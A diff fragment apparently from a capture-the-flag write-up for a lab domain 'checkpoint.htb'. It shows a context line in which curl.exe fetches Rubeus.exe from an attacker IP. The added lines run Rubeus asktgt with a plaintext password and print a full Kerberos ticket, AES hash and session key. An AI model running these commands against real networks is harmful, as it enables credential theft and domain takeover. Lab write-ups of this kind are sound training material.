@@ -1154,3 +1154,46 @@ curl.exe "http://10.10.15.179:8080/Rubeus.exe" -o "Rubeus.exe"
 PS C:\Users\ryan.brooks\Desktop>
 
 ```
+
+``` bash
+
+PS C:\Users\ryan.brooks\Desktop> .\Rubeus.exe asktgt /user:alex.turner /password:'Checkpoint2024!' /domain:checkpoint.htb /dc:10.129.113.22 /enctype:AES256 /outfile:alex.kirbi /nowrap
+.\Rubeus.exe asktgt /user:alex.turner /password:'Checkpoint2024!' /domain:checkpoint.htb /dc:10.129.113.22 /enctype:AES256 /outfile:alex.kirbi /nowrap
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.2.0
+
+[*] Action: Ask TGT
+
+[*] Using aes256_cts_hmac_sha1 hash: 8F12BA9591F2D80D1805E1C6476F9F236928F82C6063063D8D6EFFC8E5BF76E4
+[*] Building AS-REQ (w/ preauth) for: 'checkpoint.htb\alex.turner'
+[*] Using domain controller: 10.129.113.22:88
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
+      doIF1DCCBdCgAwIBBaEDAgEWooIE0DCCBMxhggTIMIIExKADAgEFoRAbDkNIRUNLUE9JTlQuSFRCoiMwIaADAgECoRowGBsGa3JidGd0Gw5jaGVja3BvaW50Lmh0YqOCBIQwggSAoAMCARKhAwIBAqKCBHIEggRu1Yz9bo/31IG/4DeQINeBwZestUnnPC2WY3kmWEdv/QdIlJ+pjCCIHf+vmyUssV/mW8WSFRjj3J3zoCnh7mQwU77RW383ZA5JMVXMNlfNun1sW7fZ9zpbNYQ0OC/NiSEHsG8Jh1hpWY3VVkiHtLZ7lKSl/LFK1wTuVusbhHeNPP76ZYs34r+YPG1XiPHTfSabLo3CkVKbZplLJ7Rou8VwtTVV8aYflXdRdABzVnjWNyB/jB73zyu9ANe1sTZoT4Ien0V8AW27L2WtZiwuG776vyIZvNWO8L7MQ4HRX95cOeNgFFWLijvuqbdW1IbWg6N9FttJL4Sru3U2SwL/1N8XkgA4NxJoB0fFiqygP1D31wyo+43unl+7SAcNxM71o+c1A8IHPK0gJU197a5gBxZYx4hIv0OTWApOuiCo16JPj3Wh7yez7pEzp/eZ92EAXzHzBn2paawjYWiF2T278aGqAocQY3XXzsDhoDL1zV8xDlr0vgsQV4MeQIEg5gEr4R7rUcU7G49Phe6v+7ipVgNRiZIt4Yz9sEaKHof7xWHg89WL2g7ymfEWRx6T/ucxnuXMeSICdOtvdLyjUtMVjUJ+0QF4phIR/c8n4VE7BSjzfVKilXr5X3rUxoqNGg47bOVBtnFoDJdN+4SKFwCAIzuibBC2MpJaaCgZDZS5ghTVjMWPncavLF4ide6JNH0PORX384WlSrBN+/1d7vopiecPhOoSwR9C5VlabiGbpWx6p7MUH20bB7+W98l3zVlKqz+DcrN40lx83y64UahgCQA7aZZc32DfVTVrm9XbqanDKfWgeHDzs4gSyJfbkkWUR/QzIJyMEBLKr65Q75qBXNL2VQaC7+oeG7mGrL03FZCuZJgVJrZ5R9Ls+jHbNe6Dt7HHj9N11pYRz1KDZcVMa/71kpKUKWwkiwD5KNmXcECQ5gaWEu7v+VkrRZMl1YID+loYJFsuA1Da4y2oefxGu2jlcLkccehkuuKfcAKcM6XL1Xn4e+5W7CW29HYqCQJwK6kbzkqmHz094PZC7tEt9hKtBVHlr3Jw6BqA/xm0VaFLA4HVOxxD/lifCKfcsmT1jwKir6k01mlsEisev5fQLwFYTVAV8UJ8XnIFubF7cWXOIJKGsdkv9UcVvezjrMWnKrY4BviQDPsHkoYEWQ9AEEBN3PL3Ird8JOxxEaS7G/CtpuVxK2uCS7A5TFXvxwehznLjxOQq4tfGdfZ6HjRhU8VlOGVv8m/qIOs4bM8xWfSeHQbD8z0eDTTyoPcu5AyZgfRmq45w55hYzYCzv0EnbMvKVyqWGa8fpTZbKzi7qMXJQYYhgjY22Xs0fomB7jrEOC0fyvZmY6b53+aFdvJSvTj7jAdq1HbYwKCusXJKPrpqpb8HiaeJUX1YPFzmiFAsbXnrYBP/iec8Z5eoLN5etpzUlFtGeBcgL/+m/ATL6DxjPIT30doanzCXlhjPrvWsR3guo/g8y50EnDFtf6mf/2eQBQOBuKaYSZVWWe3RFUSZo4HvMIHsoAMCAQCigeQEgeF9gd4wgduggdgwgdUwgdKgKzApoAMCARKhIgQgStMOEWe19mLHvv+R0j4ftE+L3iIaUiaYSXZVIwkyaPShEBsOQ0hFQ0tQT0lOVC5IVEKiGDAWoAMCAQGhDzANGwthbGV4LnR1cm5lcqMHAwUAQOEAAKURGA8yMDI2MDgyOTA0MTk0M1qmERgPMjAyNjA4MjkxNDE5NDNapxEYDzIwMjYwOTA1MDQxOTQzWqgQGw5DSEVDS1BPSU5ULkhUQqkjMCGgAwIBAqEaMBgbBmtyYnRndBsOY2hlY2twb2ludC5odGI=
+
+Exception: C:\Users\ryan.brooks\Desktop\alex.kirbi already exists! Data not written to file.
+
+
+  ServiceName              :  krbtgt/checkpoint.htb
+  ServiceRealm             :  CHECKPOINT.HTB
+  UserName                 :  alex.turner
+  UserRealm                :  CHECKPOINT.HTB
+  StartTime                :  8/28/2026 9:19:43 PM
+  EndTime                  :  8/29/2026 7:19:43 AM
+  RenewTill                :  9/4/2026 9:19:43 PM
+  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
+  KeyType                  :  aes256_cts_hmac_sha1
+  Base64(key)              :  StMOEWe19mLHvv+R0j4ftE+L3iIaUiaYSXZVIwkyaPQ=
+  ASREP (key)              :  8F12BA9591F2D80D1805E1C6476F9F236928F82C6063063D8D6EFFC8E5BF76E4
+
+PS C:\Users\ryan.brooks\Desktop>
+
+```
